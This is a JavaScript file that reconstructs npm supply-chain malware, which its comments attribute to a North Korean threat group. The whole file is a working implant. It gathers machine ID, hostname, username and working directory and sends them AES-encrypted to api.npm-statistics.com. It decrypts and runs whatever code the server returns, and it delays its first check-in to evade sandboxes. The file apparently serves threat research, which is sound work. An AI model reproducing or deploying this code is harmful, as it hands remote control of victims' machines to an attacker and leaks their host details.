// selective-c2 — reconstructed from public security analyses
// Source: https://blog.phylum.io/sophisticated-highly-targeted-attacks-continue-to-plague-npm/
//
// North Korean APT (Jade Sleet / TraderTraitor). AES-encrypted two-way C2.
// C2 monitors machine GUIDs and selectively issues payloads only to
// machines of interest. Heartbeat delayed 45s to evade sandbox.
//
// Technique: AES-encrypted C2 + selective targeting + delayed heartbeat

const https = require("https");
const crypto = require("crypto");
const os = require("os");
const { execSync } = require("child_process");

// AES encryption/decryption for C2 communication
var AES_KEY = Buffer.from("4a616465536c65657454726164657254", "hex"); // "JadeSleetTraderT"
var AES_IV = Buffer.from("72616e646f6d69766865786465636f6e", "hex");

function encrypt(text) {
  var cipher = crypto.createCipheriv("aes-128-cbc", AES_KEY, AES_IV);
  var encrypted = cipher.update(text, "utf8", "base64");
  encrypted += cipher.final("base64");
  return encrypted;
}

function decrypt(data) {
  var decipher = crypto.createDecipheriv("aes-128-cbc", AES_KEY, AES_IV);
  var decrypted = decipher.update(data, "base64", "utf8");
  decrypted += decipher.final("utf8");
  return decrypted;
}

// Get machine GUID
function getMachineGUID() {
  try {
    if (os.platform() === "win32") {
      return execSync("wmic csproduct get UUID", { encoding: "utf8" }).split("\n")[1].trim();
    } else {
      return require("fs").readFileSync("/etc/machine-id", "utf8").trim();
    }
  } catch(e) {
    return "unknown-" + os.hostname();
  }
}

// Heartbeat: check in with C2 every 45 seconds
function heartbeat() {
  var info = encrypt(JSON.stringify({
    guid: getMachineGUID(),
    hostname: os.hostname(),
    user: os.userInfo().username,
    platform: os.platform(),
    cwd: process.cwd()
  }));

  var payload = JSON.stringify({ data: info });

  var req = https.request({
    hostname: "api.npm-statistics.com",
    path: "/api/captcha",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(payload)
    }
  }, function(res) {
    var body = "";
    res.on("data", function(chunk) { body += chunk; });
    res.on("end", function() {
      try {
        var response = JSON.parse(body);
        if (response.payload) {
          // C2 sent encrypted payload — decrypt and execute
          var code = decrypt(response.payload);
          new Function(code)();
        }
      } catch(e) {}
    });
  });

  req.write(payload);
  req.end();
  req.on("error", function() {});
}

// Delay first heartbeat by 45 seconds to evade sandbox timeout
setTimeout(function() {
  heartbeat();
  // Then heartbeat every 45 seconds
  setInterval(heartbeat, 45000);
}, 45000);
